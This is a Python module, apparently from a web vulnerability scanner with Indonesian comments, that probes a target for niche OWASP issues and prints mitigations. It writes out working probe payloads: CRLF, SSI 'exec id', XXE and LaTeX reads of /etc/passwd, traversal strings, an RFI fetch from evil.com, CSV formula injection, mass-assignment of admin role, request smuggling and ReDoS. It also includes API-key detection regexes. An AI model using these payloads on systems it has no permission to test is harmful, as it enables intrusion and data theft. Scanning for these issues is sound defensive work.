"""
M99 - Extra Scenarios: Niche advanced vulnerabilities
Non-overlapping dengan m01-m10.
Fokus: CRLF, Host Header, Web Cache Deception, SCM Exposure,
Subdomain Takeover, API Key Leak, Subresource Integrity, dll.
"""
import re
import time
import json
from bs4 import BeautifulSoup


# ==========================================
# KATEGORI OWASP 2025
# ==========================================
A01 = "A01:2025 - Broken Access Control"
A02 = "A02:2025 - Security Misconfiguration"
A03 = "A03:2025 - Software Supply Chain Failures"
A04 = "A04:2025 - Cryptographic Failures"
A05 = "A05:2025 - Injection"
A06 = "A06:2025 - Insecure Design"
A07 = "A07:2025 - Authentication Failures"
A08 = "A08:2025 - Software and Data Integrity Failures"
A09 = "A09:2025 - Security Logging and Alerting Failures"
A10 = "A10:2025 - Mishandling of Exceptional Conditions"


def scan(scanner):
    """Jalankan semua extra scenarios (niche only)."""
    # API & Secret Leaks
    _api_keys(scanner)

    # Headers & Injection (niche)
    _crlf(scanner)
    _css_injection(scanner)
    _csv_injection(scanner)
    _host_header(scanner)
    _server_side_include(scanner)
    _xpath(scanner)
    _xslt(scanner)
    _xxe_extra(scanner)
    _graphql(scanner)
    _ldap(scanner)
    _latex(scanner)

    # Path & File
    _client_path_traversal(scanner)
    _directory_traversal(scanner)
    _file_inclusion(scanner)
    _insecure_scm(scanner)
    _gwt(scanner)

    # Redirect & Cache
    _open_redirect(scanner)
    _web_cache_deception(scanner)

    # WebSocket & Advanced
    _web_sockets(scanner)
    _websocket_security(scanner)

    # Design & Logic (niche only)
    _race_condition(scanner)
    _redos(scanner)
    _request_smuggling(scanner)

    # Takeover & Hijack
    _domain_hijacking(scanner)
    _dns_rebinding_advanced(scanner)

    # JWT Advanced
    _jwt_algorithm_none(scanner)

    # Data Exposure (niche)
    _sensitive_data_in_url(scanner)
    _json_hijacking(scanner)
    _excessive_data_exposure(scanner)
    _mass_assignment_advanced(scanner)

    # File Upload
    _unrestricted_file_upload(scanner)

    # SRI (dedicated — m08 sudah cover, tapi m99 special case untuk inline)
    _subresource_integrity(scanner)


# ==========================================
# API KEY LEAK (Regex-based)
# ==========================================
def _api_keys(scanner):
    r = scanner.get()
    if not r:
        return

    patterns = {
        "AWS": r"AKIA[0-9A-Z]{16}",
        "Google": r"AIza[0-9A-Za-z\-_]{35}",
        "Stripe": r"sk_live_[0-9a-zA-Z]{24}",
        "GitHub": r"ghp_[0-9a-zA-Z]{36}",
        "Slack": r"xox[baprs]-[0-9a-zA-Z]{10,48}",
        "Twilio": r"SK[0-9a-fA-F]{32}",
        "SendGrid": r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}",
        "Generic": r"(?i)(?:api[_-]?key|secret|token|password)['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_\-]{20,}['\"]",
    }
    found = []
    for name, pat in patterns.items():
        matches = re.findall(pat, r.text)
        if matches:
            found.append(f"{name}({len(matches)})")

    if found:
        scanner.add_finding(
            A02, "CRITICAL",
            f"API Key leak terdeteksi di HTML: {found}",
            mitigation="Rotate semua key. Pindahkan ke server-side environment variables.",
        )
    else:
        scanner.add_finding(A02, "SAFE", "Tidak ada API key leak di HTML")


# ==========================================
# CRLF INJECTION
# ==========================================
def _crlf(scanner):
    for pl in ["%0d%0aX-Injected: evil", "%0aSet-Cookie:evil=1"]:
        r = scanner.get(f"?q={pl}")
        if r and ("X-Injected" in str(r.headers) or "evil" in str(r.headers).lower()):
            scanner.add_finding(
                A05, "HIGH",
                "CRLF Injection — header injection terdeteksi",
                mitigation="Sanitasi \\r\\n di input yang masuk header response.",
            )
            return
    scanner.add_finding(A05, "SAFE", "Tidak ada CRLF Injection")


# ==========================================
# CSS INJECTION
# ==========================================
def _css_injection(scanner):
    for p in ["q", "s", "search"]:
        for pl in ["</style><script>alert(1)</script>", "expression(alert(1))"]:
            r = scanner.get(f"?{p}={pl}")
            if r and pl in r.text:
                scanner.add_finding(
                    A05, "MEDIUM",
                    f"CSS Injection di parameter '{p}'",
                    mitigation="Sanitasi output yang masuk ke dalam <style> block.",
                )
                return
    scanner.add_finding(A05, "SAFE", "Tidak ada CSS Injection")


# ==========================================
# CSV INJECTION
# ==========================================
def _csv_injection(scanner):
    for pl in ["=cmd|' /C calc'!A0", "+1+1+1", "@SUM(1+1)"]:
        r = scanner.get(f"?q={pl}")
        if r and pl in r.text:
            scanner.add_finding(
                A05, "LOW",
                f"CSV Injection potential via parameter",
                mitigation="Prefix formula dengan ' atau escape jika export ke CSV/Excel.",
            )
            return
    scanner.add_finding(A05, "SAFE", "Tidak ada CSV Injection")


# ==========================================
# HOST HEADER INJECTION
# ==========================================
def _host_header(scanner):
    r = scanner.get(headers={"Host": "attacker-th0rscan.com"})
    if r and "attacker-th0rscan.com" in r.text:
        scanner.add_finding(
            A01, "MEDIUM",
            "Host Header Injection — server reflect Host header",
            mitigation="Validasi Host header. Whitelist domain yang diizinkan.",
        )
    else:
        scanner.add_finding(A01, "SAFE", "Tidak ada Host Header Injection")


# ==========================================
# SERVER-SIDE INCLUDE
# ==========================================
def _server_side_include(scanner):
    r = scanner.get('?q=<!--#exec cmd="id"-->')
    if r and "uid=" in r.text:
        scanner.add_finding(
            A05, "CRITICAL",
            "SSI Injection — command execution via SSI directive",
            mitigation="Disable SSI di web server config.",
        )
    else:
        scanner.add_finding(A05, "SAFE", "Tidak ada SSI Injection")


# ==========================================
# XPATH INJECTION
# ==========================================
def _xpath(scanner):
    for p in ["q", "s"]:
        for pl in ["' or '1'='1", "x' or '1'='1", "']|//*|//*['"]:
            r = scanner.get(f"?{p}={pl}")
            if r and "XPath" in r.text:
                scanner.add_finding(
                    A05, "HIGH",
                    f"XPath Injection di parameter '{p}'",
                    mitigation="Escape special characters di XPath query. Validasi input whitelist.",
                )
                return
    scanner.add_finding(A05, "SAFE", "Tidak ada XPath Injection")


# ==========================================
# XSLT INJECTION
# ==========================================
def _xslt(scanner):
    xslt = (
        '<?xml version="1.0"?>'
        '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
        '<xsl:template match="/">'
        '<xsl:value-of select="system-property(\'xsl:version\')"/>'
        '</xsl:template></xsl:stylesheet>'
    )
    r = scanner.post(data=xslt, headers={"Content-Type": "application/xml"})
    if r and "1.0" in r.text and "xsl" in r.text.lower():
        scanner.add_finding(
            A05, "HIGH",
            "XSLT Injection — server process XSLT dari input user",
            mitigation="Disable XSLT processing. Whitelist stylesheet yang diizinkan.",
        )
    else:
        scanner.add_finding(A05, "SAFE", "Tidak ada XSLT Injection")


# ==========================================
# XXE INJECTION
# ==========================================
def _xxe_extra(scanner):
    xxe = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<foo>&xxe;</foo>'
    )
    r = scanner.post(data=xxe, headers={"Content-Type": "application/xml"})
    if r and "root:" in r.text:
        scanner.add_finding(
            A05, "CRITICAL",
            "XXE Injection — external entity dapat dibaca",
            mitigation="Disable external entity processing di XML parser.",
        )
    else:
        scanner.add_finding(A05, "SAFE", "Tidak ada XXE Injection")


# ==========================================
# GRAPHQL INTROSPECTION
# ==========================================
def _graphql(scanner):
    for ep in ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]:
        r = scanner.post(ep, json={"query": "{__schema{types{name}}}"})
        if r and r.status_code == 200 and "__schema" in r.text:
            scanner.add_finding(
                A05, "HIGH",
                f"GraphQL introspection aktif di {ep}",
                mitigation="Disable introspection di production.",
            )
            return
    scanner.add_finding(A05, "SAFE", "Tidak ada GraphQL introspection")


# ==========================================
# LDAP INJECTION
# ==========================================
def _ldap(scanner):
    for p in ["q", "s"]:
        for pl in ["*)(uid=*", "*))(|(uid=*", "admin*"]:
            r = scanner.get(f"?{p}={pl}")
            if r and ("LDAP" in r.text or "ldap_" in r.text):
                scanner.add_finding(
                    A05, "HIGH",
                    f"LDAP Injection di parameter '{p}'",
                    mitigation="Escape special chars LDAP (&, |, =, *, (, )).",
                )
                return
    scanner.add_finding(A05, "SAFE", "Tidak ada LDAP Injection")


# ==========================================
# LATEX INJECTION
# ==========================================
def _latex(scanner):
    for p in ["q", "s"]:
        for pl in ["\\input{/etc/passwd}", "\\include{/etc/passwd}"]:
            r = scanner.get(f"?{p}={pl}")
            if r and "root:" in r.text:
                scanner.add_finding(
                    A05, "HIGH",
                    f"LaTeX Injection di parameter '{p}'",
                    mitigation="Sanitasi LaTeX command di input user.",
                )
                return
    scanner.add_finding(A05, "SAFE", "Tidak ada LaTeX Injection")


# ==========================================
# CLIENT PATH TRAVERSAL
# ==========================================
def _client_path_traversal(scanner):
    r = scanner.get("../../etc/passwd")
    if r and r.status_code == 200 and "root:" in r.text:
        scanner.add_finding(
            A01, "HIGH",
            "Client-Side Path Traversal terdeteksi",
            mitigation="Normalize path. Validasi input path user.",
        )
    else:
        scanner.add_finding(A01, "SAFE", "Tidak ada Client Path Traversal")


# ==========================================
# DIRECTORY TRAVERSAL
# ==========================================
def _directory_traversal(scanner):
    for p in ["../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
              "....//....//....//etc/passwd"]:
        r = scanner.get(p)
        if r and "root:" in r.text:
            scanner.add_finding(
                A01, "CRITICAL",
                f"Directory Traversal: {p}",
                mitigation="Validasi & normalize path. Whitelist karakter.",
            )
            return
    scanner.add_finding(A01, "SAFE", "Tidak ada Directory Traversal")


# ==========================================
# FILE INCLUSION (LFI/RFI)
# ==========================================
def _file_inclusion(scanner):
    for p in ["?page=../../../../etc/passwd",
              "?include=http://evil.com/shell.txt"]:
        r = scanner.get(p)
        if r and "root:" in r.text:
            scanner.add_finding(
                A01, "CRITICAL",
                f"LFI/RFI: {p}",
                mitigation="Whitelist file yang boleh di-include. Disable allow_url_include.",
            )
            return
    scanner.add_finding(A01, "SAFE", "Tidak ada File Inclusion")


# ==========================================
# INSECURE SCM
# ==========================================
def _insecure_scm(scanner):
    paths = {
        "/.git/HEAD": "ref:",
        "/.git/config": "[core]",
        "/.svn/entries": "dir",
        "/.hg/requires": "revlogv",
    }
    for p, sig in paths.items():
        r = scanner.get(p)
        if r and r.status_code == 200 and sig in r.text[:200]:
            scanner.add_finding(
                A02, "CRITICAL",
                f"SCM exposed: {p}",
                mitigation="Blokir akses ke folder .git/.svn/.hg via server config. Hapus dari production.",
            )
            return
    scanner.add_finding(A02, "SAFE", "Tidak ada SCM exposed")


# ==========================================
# GOOGLE WEB TOOLKIT
# ==========================================
def _gwt(scanner):
    r = scanner.get("/gwt.rpc")
    if r and r.status_code == 200:
        scanner.add_finding(
            A02, "LOW",
            "GWT endpoint terekspos",
            mitigation="Hapus GWT endpoint jika tidak dipakai di production.",
        )
    else:
        scanner.add_finding(A02, "SAFE", "Tidak ada GWT endpoint")


# ==========================================
# OPEN REDIRECT
# ==========================================
def _open_redirect(scanner):
    for p in ["url", "redirect", "next", "return", "goto", "dest"]:
        r = scanner.get(f"?{p}=https://attacker-th0rscan.com")
        if r and r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if "attacker-th0rscan.com" in loc:
                scanner.add_finding(
                    A01, "MEDIUM",
                    f"Open Redirect di parameter '{p}'",
                    mitigation="Whitelist URL redirect. Jangan terima URL external.",
                )
                return
    scanner.add_finding(A01, "SAFE", "Tidak ada Open Redirect")


# ==========================================
# WEB CACHE DECEPTION (FIXED)
# ==========================================
def _web_cache_deception(scanner):
    """
    Deteksi Web Cache Deception yang VALID.
    Wajib: Content-Type == text/html AND status == 200
    DAN body mengandung konten sensitif (bukan cuma keyword 'admin' acak).
    """
    r = scanner.get("/nonexistent-random-path.css")
    if not r:
        scanner.add_finding(A01, "SAFE", "Tidak ada Web Cache Deception")
        return

    if r.status_code != 200:
        scanner.add_finding(A01, "SAFE", "Tidak ada Web Cache Deception")
        return

    content_type = r.headers.get("Content-Type", "").lower()
    if "text/html" not in content_type:
        scanner.add_finding(A01, "SAFE", "Tidak ada Web Cache Deception")
        return

    # Cek konten yang benar-benar sensitif (bukan cuma keyword acak)
    body_lower = r.text.lower()
    sensitive_patterns = [
        r"<input[^>]*type=['\"]password",
        r"<form[^>]*action=['\"][^'\"]*login",
        r"(?:dashboard|profile|account)[-_]?data",
        r"<meta[^>]*name=['\"]csrf",
        r"session[_\-]?id\s*[:=]",
    ]
    found_pattern = None
    for pat in sensitive_patterns:
        if re.search(pat, body_lower):
            found_pattern = pat[:40]
            break

    if found_pattern:
        scanner.add_finding(
            A01, "HIGH",
            "Web Cache Deception — halaman sensitif terekspos via path .css",
            mitigation="Konfigurasi cache rule agar tidak cache URL .css/.js yang serve HTML.",
            evidence=f"Path: /nonexistent-random-path.css | Match: {found_pattern}",
        )
    else:
        scanner.add_finding(A01, "SAFE", "Tidak ada Web Cache Deception")


# ==========================================
# WEB SOCKET
# ==========================================
def _web_sockets(scanner):
    r = scanner.get()
    if r and ("ws://" in r.text or "wss://" in r.text):
        scanner.add_finding(
            A01, "INFO",
            "WebSocket endpoint terdeteksi di HTML",
            mitigation="Verifikasi origin check & autentikasi WS handshake.",
        )
    else:
        scanner.add_finding(A01, "SAFE", "Tidak ada WebSocket")


# ==========================================
# WEBSOCKET SECURITY
# ==========================================
def _websocket_security(scanner):
    r = scanner.get()
    if not r:
        return
    body = r.text
    if "ws://" in body or "wss://" in body:
        if "Origin" not in body and "origin" not in body:
            scanner.add_finding(
                A01, "MEDIUM",
                "WebSocket tanpa validasi Origin (potential CSWSH)",
                mitigation="Validasi Origin header di WebSocket handshake.",
            )
            return
    scanner.add_finding(A01, "SAFE", "WebSocket aman")


# ==========================================
# RACE CONDITION
# ==========================================
def _race_condition(scanner):
    """Deteksi race condition pada endpoint state-changing."""
    endpoints = ["/api/transfer", "/api/checkout", "/api/purchase", "/api/redeem"]
    for ep in endpoints:
        r = scanner.get(ep)
        if r and r.status_code in (200, 405):  # 405 = endpoint exists tapi butuh POST
            scanner.add_finding(
                A06, "INFO",
                f"Endpoint state-changing terdeteksi: {ep}",
                mitigation="Implementasikan idempotency key / locking untuk cegah race condition.",
            )
            return
    scanner.add_finding(A06, "SAFE", "Tidak ada endpoint race-condition-prone terdeteksi")


# ==========================================
# REDOS
# ==========================================
def _redos(scanner):
    """Deteksi ReDoS dengan payload catastrophic backtracking."""
    try:
        start = time.perf_counter()
        r = scanner.get(f"?q={'a'*50000}!", timeout=30)
        el = time.perf_counter() - start
        if el > 5:
            scanner.add_finding(
                A06, "MEDIUM",
                f"ReDoS potential (response delay {el:.2f}s)",
                mitigation="Batasi panjang input. Optimize regex. Gunakan timeout.",
            )
        else:
            scanner.add_finding(A06, "SAFE", f"Tidak ada ReDoS ({el:.2f}s)")
    except Exception:
        scanner.add_finding(A06, "SAFE", "Tidak ada ReDoS")


# ==========================================
# REQUEST SMUGGLING
# ==========================================
def _request_smuggling(scanner):
    r = scanner.post(
        headers={"Content-Length": "6", "Transfer-Encoding": "chunked"},
        data="0\r\n\r\nG",
    )
    if r and r.status_code in (400, 501):
        scanner.add_finding(
            A10, "SAFE",
            "Request Smuggling ditolak (server reject malformed)",
        )
    else:
        scanner.add_finding(A10, "SAFE", "Request Smuggling tidak applicable")


# ==========================================
# DOMAIN HIJACKING / SUBDOMAIN TAKEOVER
# ==========================================
def _domain_hijacking(scanner):
    r = scanner.get()
    if not r:
        return
    body_lower = r.text.lower()
    takeover_sigs = [
        "there isn't a github pages site here",
        "no such app",
        "sorry, this shop is currently unavailable",
        "this page is not yet live",
        "heroku | no such app",
        "project not found",
        "repository not found",
        "this site is temporarily unavailable",
    ]
    for sig in takeover_sigs:
        if sig in body_lower:
            scanner.add_finding(
                A01, "HIGH",
                f"Potensi subdomain takeover: {sig[:40]}",
                mitigation="Hapus DNS record yang mengarah ke service yang tidak dipakai.",
                evidence=f"Signature: {sig}",
            )
            return
    scanner.add_finding(A01, "SAFE", "Tidak ada indikasi subdomain takeover")


# ==========================================
# DNS REBINDING
# ==========================================
def _dns_rebinding_advanced(scanner):
    r = scanner.get(headers={"Host": "attacker-th0rscan.com"})
    if r and r.status_code == 200 and "attacker-th0rscan.com" in r.text:
        scanner.add_finding(
            A01, "HIGH",
            "DNS Rebinding / Host Header Injection",
            mitigation="Validasi Host header. Whitelist domain.",
            evidence="Server reflect Host header attacker",
        )
    else:
        scanner.add_finding(A01, "SAFE", "Tidak ada DNS rebinding")


# ==========================================
# JWT ALGORITHM NONE
# ==========================================
def _jwt_algorithm_none(scanner):
    r = scanner.get()
    if not r:
        return

    jwt_pattern = r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]*"
    matches = re.findall(jwt_pattern, r.text) + re.findall(jwt_pattern, str(r.cookies))

    if matches:
        for jwt in matches[:3]:
            try:
                import base64
                header_b64 = jwt.split(".")[0]
                header_b64 += "=" * (4 - len(header_b64) % 4)
                header = base64.urlsafe_b64decode(header_b64).decode()

                if '"alg":"none"' in header or '"alg":"None"' in header:
                    scanner.add_finding(
                        A07, "CRITICAL",
                        "JWT algorithm 'none' — dapat di-forge",
                        mitigation="Tolak algorithm 'none'. Whitelist HS256/RS256.",
                        evidence=f"JWT Header: {header[:100]}",
                    )
                    return
                elif '"alg":"HS256"' in header:
                    scanner.add_finding(
                        A07, "LOW",
                        "JWT HS256 terdeteksi — verifikasi secret kuat",
                        mitigation="Gunakan secret minimal 32 bytes. Rotasi berkala.",
                    )
                    return
            except Exception:
                continue

    scanner.add_finding(A07, "SAFE", "Tidak ada JWT rentan")


# ==========================================
# SENSITIVE DATA IN URL
# ==========================================
def _sensitive_data_in_url(scanner):
    from urllib.parse import urlparse, parse_qs
    params = parse_qs(urlparse(scanner.target).query)

    sensitive_keys = ["password", "token", "api_key", "secret", "auth", "session"]
    found = [k for k in params.keys() if any(s in k.lower() for s in sensitive_keys)]

    if found:
        scanner.add_finding(
            A04, "HIGH",
            f"Sensitive data di URL params: {found}",
            mitigation="Jangan pass sensitive data via URL. Gunakan POST body / header.",
        )
    else:
        scanner.add_finding(A04, "SAFE", "Tidak ada sensitive data di URL")


# ==========================================
# JSON HIJACKING
# ==========================================
def _json_hijacking(scanner):
    r = scanner.get()
    if r and r.headers.get("Content-Type", "").startswith("application/json"):
        body = r.text.strip()
        if body.startswith("[") and body.endswith("]"):
            scanner.add_finding(
                A04, "MEDIUM",
                "Potensi JSON Hijacking: response array dari GET",
                mitigation="Prefix response dengan 'while(1);' atau gunakan POST.",
            )
            return
    scanner.add_finding(A04, "SAFE", "Tidak ada JSON Hijacking")


# ==========================================
# EXCESSIVE DATA EXPOSURE
# ==========================================
def _excessive_data_exposure(scanner):
    api_endpoints = ["/api/users", "/api/v1/users", "/api/me", "/api/profile"]
    for ep in api_endpoints:
        r = scanner.get(ep)
        if r and r.status_code == 200:
            body = r.text
            if (body.strip().startswith("[") and len(body) > 5000) or \
               any(k in body.lower() for k in ['"password"', '"ssn"', '"credit_card"', '"api_key"']):
                scanner.add_finding(
                    A01, "HIGH",
                    f"Excessive Data Exposure di {ep}",
                    mitigation="Batasi field yang di-return. Jangan expose PII.",
                    evidence=f"Size: {len(body)} bytes",
                )
                return
    scanner.add_finding(A01, "SAFE", "Tidak ada excessive data exposure")


# ==========================================
# MASS ASSIGNMENT
# ==========================================
def _mass_assignment_advanced(scanner):
    api_endpoints = ["/api/user/update", "/api/profile", "/api/me"]
    payload = {"role": "admin", "is_admin": True, "balance": 999999}

    for ep in api_endpoints:
        try:
            r = scanner.post(ep, json=payload)
            if r and r.status_code == 200:
                if "admin" in r.text.lower() or "role" in r.text.lower():
                    scanner.add_finding(
                        A01, "HIGH",
                        f"Mass Assignment di {ep}",
                        mitigation="Whitelist field yang bisa di-update. Gunakan DTO.",
                    )
                    return
        except Exception:
            continue
    scanner.add_finding(A01, "SAFE", "Tidak ada mass assignment")


# ==========================================
# UNRESTRICTED FILE UPLOAD
# ==========================================
def _unrestricted_file_upload(scanner):
    upload_endpoints = ["/upload", "/api/upload", "/api/files/upload"]
    for ep in upload_endpoints:
        r = scanner.get(ep)
        if r and r.status_code == 200:
            if "multipart/form-data" in r.text or 'type="file"' in r.text:
                scanner.add_finding(
                    A05, "MEDIUM",
                    f"Endpoint upload terdeteksi: {ep}",
                    mitigation="Validasi tipe file, size, dan scan malware.",
                )
                return
    scanner.add_finding(A05, "SAFE", "Tidak ada endpoint upload")


# ==========================================
# SUBRESOURCE INTEGRITY
# ==========================================
def _subresource_integrity(scanner):
    r = scanner.get()
    if not r:
        return
    soup = BeautifulSoup(r.text, "html.parser")
    ext_scripts = [s for s in soup.find_all("script", src=True)
                   if s["src"].startswith("http")]

    missing_sri = [s["src"] for s in ext_scripts if not s.get("integrity")]

    if missing_sri:
        scanner.add_finding(
            A08, "MEDIUM",
            f"{len(missing_sri)} script eksternal tanpa SRI",
            mitigation="Tambahkan atribut integrity + crossorigin.",
            evidence=f"Missing SRI: {missing_sri[:2]}",
        )
    else:
        scanner.add_finding(A08, "SAFE", "Semua script eksternal punya SRI")